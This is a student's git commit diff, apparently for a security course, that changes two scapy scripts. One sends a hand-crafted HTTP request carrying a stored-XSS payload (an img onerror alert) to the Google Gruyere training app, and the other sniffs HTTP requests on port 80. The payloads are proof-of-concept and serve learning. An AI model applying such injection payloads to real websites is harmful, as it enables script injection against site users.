6dca879e63d837822a45be6301ff8b3ccd6f4429
Ivan <iadoronin@edu.hse.ru>
2025-02-09 02:50:31 +0300

    finish task9

--- custom_http.py
+++ custom_http.py
@@ -1,31 +1,43 @@
-#!/usr/bin/env python
-
 from scapy.all import *
 from scapy.layers.inet import IP, TCP
 import random
-import sys
+import socket
 
-dest = sys.argv[1]
-try:
-    if sys.argv[2]:
-        getStr = sys.argv[2]
-except:
-    getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: gzip, deflate\r\n\r\n'
+dest = "google-gruyere.appspot.com"
+dest_ip = socket.gethostbyname(dest)
+base_url = "/635188155526610086574573700068583544679"
 
-try:
-    if sys.argv[3]:
-        max = int(sys.argv[3])
-except:
-    max = 10
+endpoints = ["/saveprofile?action=update&name=ChillCheeseGuy&oldpw=cheese123&pw=&icon=&web_site=&color=&private_snippet=%3Cimg+src%3D%22nonexistent.jpg%22+onerror%3D%22alert%28%27XSS%27%29%22%3E"]
+# "/editprofile.gtl", "/snippets.gtl", "/newsnippet.gtl", "/upload.gtl", "/login", "/newaccount.gtl", "/logout", "/upload.gtl
+max_requests = 1
 
-counter = 0
-while counter < max:
-    # SEND SYN
-    syn = IP(dst=dest) / TCP(sport=random.randint(1025, 65500), dport=80, flags='S')
-    # GET SYNACK
-    syn_ack = sr1(syn)
-    # Send ACK
-    out_ack = send(IP(dst=dest) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A'))
-    # Send the HTTP GET
-    sr1(IP(dst=dest) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA') / getStr)
-    counter += 1
+payload = "<script>alert('XSS')</script>"
+
+for endpoint in endpoints:
+    getStr = f'GET {base_url + endpoint} HTTP/1.1\r\nHost: {dest}\r\nAccept-Encoding: gzip, deflate\r\n\r\n'
+
+    counter = 0
+    while counter < max_requests:
+        try:
+            syn = IP(dst=dest_ip) / TCP(sport=random.randint(1025, 65500), dport=80, flags='S')
+            syn_ack = sr1(syn, timeout=2)
+
+            if not syn_ack or TCP not in syn_ack:
+                print(f"Не удалось получить SYN-ACK для запроса {counter + 1}.")
+                break
+
+            ack = IP(dst=dest_ip) / TCP(dport=80, sport=syn_ack[TCP].sport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A')
+            send(ack, verbose=0)
+
+            http_request = IP(dst=dest_ip) / TCP(dport=80, sport=syn_ack[TCP].sport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA') / getStr
+            response = sr1(http_request, timeout=2)
+
+            if response:
+                print(f"Ответ получен для запроса {counter + 1}: {response.summary()}")
+            else:
+                print(f"Нет ответа для запроса {counter + 1}.")
+
+        except Exception as e:
+            print(f"Ошибка при обработке запроса {counter + 1}: {e}")
+
+        counter += 1
--- task9.py
+++ task9.py
@@ -1,22 +1,9 @@
-#!/usr/bin/env python
-
-"""
-Script to open TCP connection and send 1 HTTP GET request containing
-a specific string, and header
-Usage:
-./http.py <IP_of_target>
-There is only one mandatory argument, which is the target IP address.
-If other arguments are omitted, will send a preconfigured URL string 
-10 times
-Optional arguments are : 
-./http.py <IP_of_target> |HTTP GET STRING| |Max requests|
-e.g.
-./http.py 10.10.10.10 'GET / HTTP/1.1\r\n' 100
-"""
 from scapy.all import *
-from scapy.layers.inet import TCP
+from scapy.layers.http import HTTPRequest 
 
 def http_filter(packet):
-    return packet.haslayer(TCP) and packet.haslayer(Raw) and (b"HTTP" in packet[Raw].load)
+    if HTTPRequest in packet:
+        http_layer = packet[HTTPRequest]
+        print(f'{http_layer.Method.decode()} {http_layer.Path.decode()}')
 
-sniff(filter="tcp port 80", prn=lambda x: x.show() if http_filter(x) else None, store=False)
+sniff(filter="port 80", prn=http_filter, store=0)
